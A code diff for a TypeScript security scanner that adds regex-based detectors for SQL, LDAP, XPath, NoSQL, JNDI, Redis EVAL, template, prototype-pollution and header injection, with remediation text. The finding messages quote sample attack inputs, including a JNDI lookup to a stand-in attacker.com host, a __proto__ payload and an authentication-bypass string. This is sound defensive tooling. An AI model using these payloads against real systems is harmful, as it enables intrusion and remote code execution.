@@ -44,42 +44,140 @@ async function checkXxe(): Promise<Finding | null> {
   };
 }
 
-async function checkSsti(): Promise<Finding | null> {
-  const hits = await codeSearch(
-    String.raw`(?:Handlebars\.compile|ejs\.render|ejs\.compile|nunjucks\.renderString|pug\.compile|pug\.render|\.template\s*\(|Mustache\.render)\s*\(\s*(?:req\.|body\.|params\.|query\.|user\.|input|template|src)`
+async function checkSsti(): Promise<Finding[]> {
+  const findings: Finding[] = [];
+
+  // Pass 1: same-line detection + additional engines
+  const sameLineHits = await codeSearch(
+    String.raw`(?:Handlebars\.compile|ejs\.render|ejs\.compile|nunjucks\.renderString|pug\.compile|pug\.render|\.template\s*\(|Mustache\.render|mustache\.render|handlebars\.compile|swig\.render|dot\.template|consolidate\.\w+)\s*\(\s*(?:req\.|body\.|params\.|query\.|user\.|input|template|src)`
   );
-  if (!hits.length) return null;
-  return {
-    id: "SSTI_TEMPLATE_COMPILE",
-    title: "Server-side template compiled from user input (SSTI — CWE-94)",
-    severity: "CRITICAL",
-    evidence: toEvidence(hits),
-    files: toFiles(hits),
-    requiredActions: [
-      "Never compile templates from user input — only render with user-controlled data as context variables.",
-      "CWE-94 / ATT&CK T1059 — SSTI achieves RCE via template engine expression evaluation.",
-      "Fix: precompile templates at build time; pass untrusted data only as template context, never as template source."
-    ]
-  };
+  if (sameLineHits.length) {
+    findings.push({
+      id: "SSTI_TEMPLATE_COMPILE",
+      title: "Server-side template compiled from user input (SSTI — CWE-94)",
+      severity: "CRITICAL",
+      evidence: toEvidence(sameLineHits),
+      files: toFiles(sameLineHits),
+      requiredActions: [
+        "Never compile templates from user input — only render with user-controlled data as context variables.",
+        "CWE-94 / ATT&CK T1059 — SSTI achieves RCE via template engine expression evaluation.",
+        "Fix: precompile templates at build time; pass untrusted data only as template context, never as template source."
+      ]
+    });
+  }
+
+  // Pass 2: two-pass variable tracking — find assignments of user input to variables
+  const assignHits = await codeSearch(
+    String.raw`const\s+(\w+)\s*=\s*(?:req\.|body\.|params\.|query\.)`
+  );
+
+  if (assignHits.length) {
+    const varNameRe = /const\s+(\w+)\s*=/;
+    const varNames = [...new Set(
+      assignHits.map((h) => { const m = varNameRe.exec(h.preview); return m ? m[1] : null; }).filter(Boolean)
+    )] as string[];
+
+    if (varNames.length) {
+      const enginePattern = String.raw`(?:Handlebars\.compile|ejs\.render|ejs\.compile|nunjucks\.renderString|pug\.compile|pug\.render|mustache\.render|Mustache\.render|swig\.render|dot\.template|consolidate\.\w+|handlebars\.compile)\s*\(\s*(?:${varNames.join("|")})`;
+      const varHits = await codeSearch(enginePattern);
+      const newHits = varHits.filter(
+        (h) => !sameLineHits.some((s) => s.file === h.file && s.line === h.line)
+      );
+      if (newHits.length) {
+        findings.push({
+          id: "SSTI_TEMPLATE_COMPILE_INDIRECT",
+          title: "Server-side template compiled from variable holding user input (SSTI — CWE-94)",
+          severity: "CRITICAL",
+          evidence: toEvidence(newHits),
+          files: toFiles(newHits),
+          requiredActions: [
+            "Never compile templates from user input — only render with user-controlled data as context variables.",
+            "CWE-94 / ATT&CK T1059 — SSTI achieves RCE even when user input is stored in an intermediate variable.",
+            "Fix: precompile templates at build time; pass untrusted data only as template context, never as template source."
+          ]
+        });
+      }
+    }
+  }
+
+  return findings;
 }
 
-async function checkPrototypePollution(): Promise<Finding | null> {
-  const hits = await codeSearch(
+async function checkPrototypePollution(): Promise<Finding[]> {
+  const findings: Finding[] = [];
+
+  // Original merge-with-user-input pattern
+  const mergeHits = await codeSearch(
     String.raw`(?:_\.merge|Object\.assign|deepmerge|lodash\.merge|merge\s*\()\s*\(\s*(?:\{\}|obj|target|options|config|settings|result)\s*,\s*(?:req\.|body\.|params\.|query\.|user\.|payload\.|data\.)`
   );
-  if (!hits.length) return null;
-  return {
-    id: "PROTOTYPE_POLLUTION",
-    title: "Unsafe merge of user-controlled data into plain object — prototype pollution risk (CWE-1321)",
-    severity: "HIGH",
-    evidence: toEvidence(hits),
-    files: toFiles(hits),
-    requiredActions: [
-      "Validate with Zod/Joi schema before merging; use Object.create(null) as the merge target.",
-      "CWE-1321 / ATT&CK T1548 — payload {\"__proto__\":{\"isAdmin\":true}} can pollute all objects in the process.",
-      "Fix: const safe = schema.parse(req.body); Object.assign(Object.create(null), defaults, safe);"
-    ]
-  };
+  if (mergeHits.length) {
+    findings.push({
+      id: "PROTOTYPE_POLLUTION",
+      title: "Unsafe merge of user-controlled data into plain object — prototype pollution risk (CWE-1321)",
+      severity: "HIGH",
+      evidence: toEvidence(mergeHits),
+      files: toFiles(mergeHits),
+      requiredActions: [
+        "Validate with Zod/Joi schema before merging; use Object.create(null) as the merge target.",
+        "CWE-1321 / ATT&CK T1548 — payload {\"__proto__\":{\"isAdmin\":true}} can pollute all objects in the process.",
+        "Fix: const safe = schema.parse(req.body); Object.assign(Object.create(null), defaults, safe);"
+      ]
+    });
+  }
+
+  // Direct __proto__ assignment patterns
+  const directProtoHits = await codeSearch(
+    String.raw`(?:\.__proto__\s*=|\['__proto__'\]\s*=|\["__proto__"\]\s*=|\.constructor\.prototype\s*=)`
+  );
+  if (directProtoHits.length) {
+    findings.push({
+      id: "PROTOTYPE_POLLUTION_DIRECT",
+      title: "Direct __proto__ or constructor.prototype assignment — prototype pollution (CWE-1321)",
+      severity: "HIGH",
+      evidence: toEvidence(directProtoHits),
+      files: toFiles(directProtoHits),
+      requiredActions: [
+        "Never assign to __proto__ or constructor.prototype from user-controlled data.",
+        "CWE-1321 — direct prototype pollution corrupts all object instances sharing the prototype chain.",
+        "Fix: use Object.create(null) for maps; validate all keys with allowlists before any property assignment."
+      ]
+    });
+  }
+
+  // Two-pass: JSON.parse of user input → variable → Object.assign/merge
+  const jsonParseHits = await codeSearch(
+    String.raw`JSON\.parse\s*\([^)]*(?:req\.|body\.|params\.|query\.)[^)]*\)`
+  );
+  if (jsonParseHits.length) {
+    const varNameRe = /(?:const|let|var)\s+(\w+)\s*=\s*JSON\.parse/;
+    const varNames = [...new Set(
+      jsonParseHits.map((h) => { const m = varNameRe.exec(h.preview); return m ? m[1] : null; }).filter(Boolean)
+    )] as string[];
+
+    if (varNames.length) {
+      const mergePattern = String.raw`(?:Object\.assign|deepmerge|_\.merge|lodash\.merge|merge\s*\()\s*\([^)]*(?:${varNames.join("|")})`;
+      const indirectHits = await codeSearch(mergePattern);
+      const newHits = indirectHits.filter(
+        (h) => !mergeHits.some((s) => s.file === h.file && s.line === h.line)
+      );
+      if (newHits.length) {
+        findings.push({
+          id: "PROTOTYPE_POLLUTION_JSON_PARSE",
+          title: "JSON.parse of user input passed to Object.assign/merge — prototype pollution risk (CWE-1321)",
+          severity: "HIGH",
+          evidence: toEvidence(newHits),
+          files: toFiles(newHits),
+          requiredActions: [
+            "Validate parsed JSON with a schema (Zod/Joi) before merging into objects.",
+            "CWE-1321 — JSON.parse('{\"__proto__\":{\"isAdmin\":true}}') followed by Object.assign pollutes all objects.",
+            "Fix: const safe = schema.parse(JSON.parse(req.body.data)); Object.assign(Object.create(null), defaults, safe);"
+          ]
+        });
+      }
+    }
+  }
+
+  return findings;
 }
 
 async function checkOpenRedirect(): Promise<Finding | null> {
@@ -123,26 +221,54 @@ async function checkNosqlInjection(): Promise<Finding | null> {
   };
 }
 
-async function checkCrlfInjection(): Promise<Finding | null> {
-  const hits = await codeSearch(
+async function checkCrlfInjection(): Promise<Finding[]> {
+  const findings: Finding[] = [];
+
+  // Original: res.setHeader with user input
+  const headerHits = await codeSearch(
     String.raw`res\.setHeader\s*\(\s*[^,]+,\s*(?:req\.|body\.|params\.|query\.|user\.|headers\.)`
   );
-  const unsafe = hits.filter(
+  const unsafeHeaders = headerHits.filter(
     (h) => !/replace\s*\(.*\\r|replace\s*\(.*\\n|sanitize|encodeURIComponent/.test(h.preview)
   );
-  if (!unsafe.length) return null;
-  return {
-    id: "CRLF_INJECTION",
-    title: "CRLF injection risk — user value written to HTTP response header (CWE-113)",
-    severity: "HIGH",
-    evidence: toEvidence(unsafe),
-    files: toFiles(unsafe),
-    requiredActions: [
-      String.raw`Strip \r and \n from any user-controlled value before writing to response headers.`,
-      "CWE-113 — CRLF injection enables HTTP response splitting, header injection, session fixation.",
-      String.raw`Fix: const safe = value.replace(/[\r\n]/g, ''); res.setHeader('X-Header', safe);`
-    ]
-  };
+  if (unsafeHeaders.length) {
+    findings.push({
+      id: "CRLF_INJECTION",
+      title: "CRLF injection risk — user value written to HTTP response header (CWE-113)",
+      severity: "HIGH",
+      evidence: toEvidence(unsafeHeaders),
+      files: toFiles(unsafeHeaders),
+      requiredActions: [
+        String.raw`Strip \r and \n from any user-controlled value before writing to response headers.`,
+        "CWE-113 — CRLF injection enables HTTP response splitting, header injection, session fixation.",
+        String.raw`Fix: const safe = value.replace(/[\r\n]/g, ''); res.setHeader('X-Header', safe);`
+      ]
+    });
+  }
+
+  // Extended: cookie, append, location, response.redirect with user input
+  const extendedHits = await codeSearch(
+    String.raw`(?:res\.cookie\s*\([^,]*(?:req\.|body\.|params\.|query\.)|res\.append\s*\(\s*[^,]+,\s*(?:req\.|body\.|params\.|query\.)|res\.location\s*\(\s*(?:req\.|body\.|params\.|query\.)|response\.redirect\s*\(\s*(?:req\.|body\.|params\.|query\.))`
+  );
+  const unsafeExtended = extendedHits.filter(
+    (h) => !/replace\s*\(.*\\r|replace\s*\(.*\\n|sanitize|encodeURIComponent|allowlist|validateRedirect/.test(h.preview)
+  );
+  if (unsafeExtended.length) {
+    findings.push({
+      id: "HTTP_HEADER_INJECTION",
+      title: "HTTP header/cookie injection — user value written to response cookie, header, or location (CWE-113)",
+      severity: "HIGH",
+      evidence: toEvidence(unsafeExtended),
+      files: toFiles(unsafeExtended),
+      requiredActions: [
+        String.raw`Strip \r and \n from user-controlled values before writing to cookies, headers, or redirect locations.`,
+        "CWE-113 / CWE-601 — header injection via CRLF enables response splitting, session fixation, and open redirect.",
+        String.raw`Fix: const safe = value.replace(/[\r\n]/g, ''); res.cookie('name', safe, { httpOnly: true, secure: true });`
+      ]
+    });
+  }
+
+  return findings;
 }
 
 async function checkYamlUnsafeLoad(): Promise<Finding | null> {
@@ -271,23 +397,48 @@ async function checkCommandInjection(): Promise<Finding | null> {
   };
 }
 
-async function checkRedos(): Promise<Finding | null> {
-  const hits = await codeSearch(
+async function checkRedos(): Promise<Finding[]> {
+  const findings: Finding[] = [];
+
+  // Original: new RegExp from user input
+  const dynHits = await codeSearch(
     String.raw`new\s+RegExp\s*\(\s*(?:req\.|body\.|params\.|query\.|user\.|input\b|pattern\b|search\b|filter\b)`
   );
-  if (!hits.length) return null;
-  return {
-    id: "REDOS_USER_REGEXP",
-    title: "ReDoS — user-controlled input used to construct RegExp — catastrophic backtracking (CWE-1333)",
-    severity: "HIGH",
-    evidence: toEvidence(hits),
-    files: toFiles(hits),
-    requiredActions: [
-      "Never construct RegExp from user input. Escape with escape-string-regexp, or use string.includes() / startsWith().",
-      "CWE-1333 / ATT&CK T1499 — a crafted pattern like (a+)+ causes exponential backtracking that hangs the Node.js event loop.",
-      "Fix: const safe = escapeStringRegexp(userInput); const re = new RegExp(safe);"
-    ]
-  };
+  if (dynHits.length) {
+    findings.push({
+      id: "REDOS_USER_REGEXP",
+      title: "ReDoS — user-controlled input used to construct RegExp — catastrophic backtracking (CWE-1333)",
+      severity: "HIGH",
+      evidence: toEvidence(dynHits),
+      files: toFiles(dynHits),
+      requiredActions: [
+        "Never construct RegExp from user input. Escape with escape-string-regexp, or use string.includes() / startsWith().",
+        "CWE-1333 / ATT&CK T1499 — a crafted pattern like (a+)+ causes exponential backtracking that hangs the Node.js event loop.",
+        "Fix: const safe = escapeStringRegexp(userInput); const re = new RegExp(safe);"
+      ]
+    });
+  }
+
+  // Static regex with catastrophic backtracking patterns applied to user input
+  const staticReHits = await codeSearch(
+    String.raw`\/(?:[^\/]*\([^)]*[+*][^)]*\)[+*][^\/]*|[^\/]*\([^)]*[+*][^)]*\)\{[0-9,]+\}[^\/]*|[^\/]*(?:a\|aa|a\+b|\w\+\s\*)[^\/]*)[+*?]?\/[gimsuy]*\s*\.\s*(?:test|match|exec)\s*\(\s*(?:req\.|body\.|params\.|query\.)`
+  );
+  if (staticReHits.length) {
+    findings.push({
+      id: "REDOS_STATIC_PATTERN",
+      title: "ReDoS — static regex with catastrophic backtracking pattern applied to user input (CWE-1333)",
+      severity: "HIGH",
+      evidence: toEvidence(staticReHits),
+      files: toFiles(staticReHits),
+      requiredActions: [
+        "Audit regex for nested quantifiers (e.g. (a+)+, (\\w+\\s*)+, (a|aa)+) — these cause exponential backtracking.",
+        "CWE-1333 / ATT&CK T1499 — a malicious input string can hang the Node.js event loop for seconds per request.",
+        "Fix: use a safe regex library (re2) or rewrite the pattern to eliminate ambiguity; add an input length limit."
+      ]
+    });
+  }
+
+  return findings;
 }
 
 async function checkJsonpCallbackInjection(): Promise<Finding | null> {
@@ -328,6 +479,261 @@ async function checkEvalEncodedPayload(): Promise<Finding | null> {
   };
 }
 
+// ─── NEW CHECKS ──────────────────────────────────────────────────────────────
+
+async function checkSqlInjection(): Promise<Finding[]> {
+  const findings: Finding[] = [];
+
+  // Direct SQL keyword + template literal interpolation
+  const templateSqlHits = await codeSearch(
+    String.raw`(?:SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|EXEC(?:UTE)?|UNION|TRUNCATE)[^'";\n]*\$\{`
+  );
+  if (templateSqlHits.length) {
+    findings.push({
+      id: "SQL_INJECTION",
+      title: "SQL injection — SQL keyword with template literal interpolation (CWE-89)",
+      severity: "CRITICAL",
+      evidence: toEvidence(templateSqlHits),
+      files: toFiles(templateSqlHits),
+      requiredActions: [
+        "Never interpolate user input into SQL strings. Use parameterized queries or prepared statements exclusively.",
+        "CWE-89 / ATT&CK T1190 — SQL injection enables authentication bypass, data exfiltration, and database destruction.",
+        "Fix: db.query('SELECT * FROM users WHERE id = $1', [userId]) or use an ORM with parameterized inputs."
+      ]
+    });
+  }
+
+  // SQL keyword + string concatenation with user input
+  const concatSqlHits = await codeSearch(
+    String.raw`(?:SELECT|INSERT|UPDATE|DELETE)[^'";\n]*['"]\s*\+\s*(?:req\.|body\.|params\.|query\.|\w+Id\b|\w+Name\b)`
+  );
+  if (concatSqlHits.length) {
+    findings.push({
+      id: "SQL_INJECTION_CONCAT",
+      title: "SQL injection — SQL query built via string concatenation with user input (CWE-89)",
+      severity: "CRITICAL",
+      evidence: toEvidence(concatSqlHits),
+      files: toFiles(concatSqlHits),
+      requiredActions: [
+        "Replace string concatenation in SQL queries with parameterized queries or prepared statements.",
+        "CWE-89 / ATT&CK T1190 — ' OR '1'='1 via string concatenation bypasses authentication entirely.",
+        "Fix: use db.query('SELECT * FROM users WHERE name = ?', [name]) — never string concatenation."
+      ]
+    });
+  }
+
+  // ORM raw query escape hatches
+  // Note: $queryRaw/`...` is a safe Prisma tagged template (parameterized automatically).
+  // Only flag the function-call form $queryRaw( which bypasses the tagged-template safety guarantee.
+  const ormRawHits = await codeSearch(
+    String.raw`(?:\$queryRaw\s*\(|\$executeRaw\s*\(|sequelize\.query\s*\(|Sequelize\.literal\s*\(|knex\.raw\s*\(|\.query\s*\(\s*[\x60'"][^\x60'"]*\$\{)`
+  );
+  if (ormRawHits.length) {
+    findings.push({
+      id: "ORM_RAW_INJECTION",
+      title: "ORM raw query escape hatch — potential SQL injection via Prisma/Sequelize/Knex raw (CWE-89)",
+      severity: "CRITICAL",
+      evidence: toEvidence(ormRawHits),
+      files: toFiles(ormRawHits),
+      requiredActions: [
+        "Use ORM parameterized APIs: Prisma.sql tagged template, sequelize query with replacements array, knex bindings.",
+        "CWE-89 — $queryRaw with template literals or Sequelize.literal() bypass ORM query sanitization.",
+        "Fix (Prisma): prisma.$queryRaw`SELECT * FROM User WHERE id = ${userId}` — always use Prisma.sql or tagged template."
+      ]
+    });
+  }
+
+  // TypeORM createQueryBuilder .where() with template literal
+  const typeormHits = await codeSearch(
+    String.raw`createQueryBuilder\(\)[^;]*\.where\s*\(\s*[\x60'"][^\x60'"]*\$\{`
+  );
+  if (typeormHits.length) {
+    const existingOrmFiles = new Set(ormRawHits.map((h) => h.file));
+    const newHits = typeormHits.filter((h) => !existingOrmFiles.has(h.file));
+    if (newHits.length) {
+      findings.push({
+        id: "ORM_RAW_INJECTION_TYPEORM",
+        title: "TypeORM createQueryBuilder with interpolated .where() clause — SQL injection risk (CWE-89)",
+        severity: "CRITICAL",
+        evidence: toEvidence(newHits),
+        files: toFiles(newHits),
+        requiredActions: [
+          "Use TypeORM parameterized .where('field = :param', { param: value }) — never template literals in .where().",
+          "CWE-89 — template literal interpolation in TypeORM .where() bypasses query parameterization.",
+          "Fix: .where('user.id = :id', { id: userId }) instead of .where(`user.id = ${userId}`)."
+        ]
+      });
+    }
+  }
+
+  return findings;
+}
+
+async function checkMongoAggregationInjection(): Promise<Finding | null> {
+  // Search for .aggregate() calls in the same files as dangerous operators
+  const aggregateHits = await codeSearch(
+    String.raw`\.aggregate\s*\(\s*\[`
+  );
+  const dangerousOpHits = await codeSearch(
+    String.raw`\$where|\$function|\$accumulator`
+  );
+
+  const aggregateFiles = new Set(aggregateHits.map((h) => h.file));
+  const dangerousFiles = dangerousOpHits.filter((h) => aggregateFiles.has(h.file));
+
+  // Also check for $expr in aggregate context (inline)
+  const exprHits = await codeSearch(
+    String.raw`\.aggregate\s*\(\s*\[[^\]]*\$expr`
+  );
+
+  // Direct $where in .find()
+  const findWhereHits = await codeSearch(
+    String.raw`\.find\s*\(\s*\{[^}]*\$where`
+  );
+
+  const allHits = [...dangerousFiles, ...exprHits, ...findWhereHits];
+  if (!allHits.length) return null;
+
+  return {
+    id: "NOSQL_AGGREGATE_INJECTION",
+    title: "MongoDB aggregation with $where/$function/$expr/$accumulator — NoSQL injection risk (CWE-943)",
+    severity: "CRITICAL",
+    evidence: toEvidence(allHits),
+    files: toFiles(allHits),
+    requiredActions: [
+      "Avoid $where, $function, and $accumulator with user-controlled data — these execute JavaScript on the MongoDB server.",
+      "CWE-943 / ATT&CK T1190 — $where: 'sleep(5000)' causes DoS; $function can execute arbitrary server-side JS.",
+      "Fix: replace $where with MongoDB operators ($eq, $gt, $in, etc.); if $function is required, validate all inputs strictly with Zod."
+    ]
+  };
+}
+
+async function checkLdapInjection(): Promise<Finding | null> {
+  const ldapLibHits = await codeSearch(
+    String.raw`require\s*\(\s*['"](?:ldapjs|ldapts|activedirectory)['"]\)`
+  );
+  if (!ldapLibHits.length) return null;
+
+  const filterHits = await codeSearch(
+    String.raw`(?:\(uid=.*req\.|filter.*\+.*req\.|dn.*\+.*req\.|searchFilter.*\+|filter\s*=\s*[\x60'"][^\x60'"]*\$\{)`
+  );
+  if (!filterHits.length) return null;
+
+  return {
+    id: "LDAP_INJECTION",
+    title: "LDAP injection — user input concatenated into LDAP filter string (CWE-90)",
+    severity: "HIGH",
+    evidence: toEvidence(filterHits),
+    files: toFiles(filterHits),
+    requiredActions: [
+      "Escape all special LDAP characters in user input: ( ) * \\ NUL and slashes before constructing filter strings.",
+      "CWE-90 — LDAP injection via (*)(uid=*))(|(uid=* bypasses authentication and dumps directory contents.",
+      "Fix: use ldapjs escape: const safe = ldap.searchFilterEscape(userInput); or validate input strictly before use."
+    ]
+  };
+}
+
+async function checkXpathInjection(): Promise<Finding | null> {
+  const xpathLibHits = await codeSearch(
+    String.raw`require\s*\(\s*['"]xpath['"]|xpath\.select|xpath\.evaluate|XPathEvaluator`
+  );
+  if (!xpathLibHits.length) return null;
+
+  const injectionHits = await codeSearch(
+    String.raw`(?:xpath.*\+.*req\.|select\s*\([^)]*req\.|evaluate\s*\([^)]*req\.|xpath\s*=\s*[\x60'"][^\x60'"]*\$\{[^\x60'"]*(?:req|body|params|query))`
+  );
+  if (!injectionHits.length) return null;
+
+  return {
+    id: "XPATH_INJECTION",
+    title: "XPath injection — user input concatenated into XPath expression (CWE-643)",
+    severity: "HIGH",
+    evidence: toEvidence(injectionHits),
+    files: toFiles(injectionHits),
+    requiredActions: [
+      "Use parameterized XPath queries or escape all XPath special characters from user input.",
+      "CWE-643 — XPath injection via ' or '1'='1 bypasses authentication and exposes the full XML document.",
+      "Fix: use a parameterized XPath library or strictly validate/allowlist all user values used in XPath expressions."
+    ]
+  };
+}
+
+async function checkJndiInjection(): Promise<Finding[]> {
+  const findings: Finding[] = [];
+
+  // Direct JNDI lookup strings in code — CRITICAL
+  const jndiLiteralHits = await codeSearch(
+    String.raw`\$\{jndi:`
+  );
+  if (jndiLiteralHits.length) {
+    findings.push({
+      id: "LOG4SHELL_JNDI_LITERAL",
+      title: "JNDI lookup string found in codebase — Log4Shell/JNDI injection (CVE-2021-44228)",
+      severity: "CRITICAL",
+      evidence: toEvidence(jndiLiteralHits),
+      files: toFiles(jndiLiteralHits),
+      requiredActions: [
+        "Remove any ${jndi: strings from code immediately — these indicate either a test payload or live attack vector.",
+        "CVE-2021-44228 (Log4Shell) — JNDI lookup strings in log data trigger remote class loading and RCE.",
+        "Fix: update all logging frameworks; add JNDI sanitization filter to strip ${jndi: patterns from all user input."
+      ]
+    });
+  }
+
+  // User input flowing into log calls without JNDI sanitization
+  const logUserInputHits = await codeSearch(
+    String.raw`(?:logger\.\w+|console\.log)\s*\(\s*[\x60][^\x60]*\$\{(?:req|body|params|query)\.[^\x60]*[\x60]`
+  );
+  const unsafeLogHits = logUserInputHits.filter(
+    (h) => !/jndi|sanitize|replace.*jndi|stripJndi|filterJndi/.test(h.preview)
+  );
+  if (unsafeLogHits.length) {
+    findings.push({
+      id: "LOG_JNDI_INJECTION_RISK",
+      title: "User input interpolated into log statement — JNDI injection risk if using Java logging or proxied to Log4j (CWE-117)",
+      severity: "HIGH",
+      evidence: toEvidence(unsafeLogHits),
+      files: toFiles(unsafeLogHits),
+      requiredActions: [
+        "Sanitize user input before logging — strip or encode ${jndi: patterns to prevent Log4Shell-style injection.",
+        "CWE-117 / CVE-2021-44228 — user-controlled ${jndi:ldap://attacker.com/x} in logs triggers JNDI lookup and RCE.",
+        String.raw`Fix: const safe = input.replace(/\$\{jndi:/gi, '[blocked:'); logger.info('Request: ' + safe);`
+      ]
+    });
+  }
+
+  return findings;
+}
+
+async function checkRedisEvalInjection(): Promise<Finding | null> {
+  // First check if any eval-like Redis calls exist at all
+  const evalHits = await codeSearch(
+    String.raw`(?:\.eval\s*\(|EVAL\s+|evalsha\s*\(|EVALSHA\s*\()`
+  );
+  if (!evalHits.length) return null;
+
+  // Narrow to cases where user input appears in the eval call
+  const userInputHits = await codeSearch(
+    String.raw`\.eval\s*\([^)]*(?:req\.|body\.|params\.|query\.)`
+  );
+  if (!userInputHits.length) return null;
+
+  return {
+    id: "REDIS_EVAL_INJECTION",
+    title: "Redis EVAL with user-controlled input — server-side Lua injection risk (CWE-95)",
+    severity: "HIGH",
+    evidence: toEvidence(userInputHits),
+    files: toFiles(userInputHits),
+    requiredActions: [
+      "Never pass user-controlled values as part of Redis EVAL Lua scripts — only pass them as KEYS or ARGV arguments.",
+      "CWE-95 — Redis EVAL executes Lua on the Redis server; injection can exfiltrate data or corrupt the dataset.",
+      "Fix: client.eval(STATIC_LUA_SCRIPT, numkeys, ...keys, ...argv) where argv contains user values, not the script itself."
+    ]
+  };
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+
 export async function checkInjectionDeep(_opts: { changedFiles: string[] }): Promise<Finding[]> {
   try {
     const results = await Promise.all([
@@ -346,8 +752,15 @@ export async function checkInjectionDeep(_opts: { changedFiles: string[] }): Pro
       checkRedos(),
       checkJsonpCallbackInjection(),
       checkEvalEncodedPayload(),
+      // New checks
+      checkSqlInjection(),
+      checkMongoAggregationInjection(),
+      checkLdapInjection(),
+      checkXpathInjection(),
+      checkJndiInjection(),
+      checkRedisEvalInjection(),
     ]);
-    return results.filter((f): f is Finding => f !== null);
+    return results.flat().filter((f): f is Finding => f !== null);
   } catch (err) {
     console.warn("[checkInjectionDeep] Internal error:", sanitizeErrorMessage(err instanceof Error ? err.message : String(err)));
     return [];
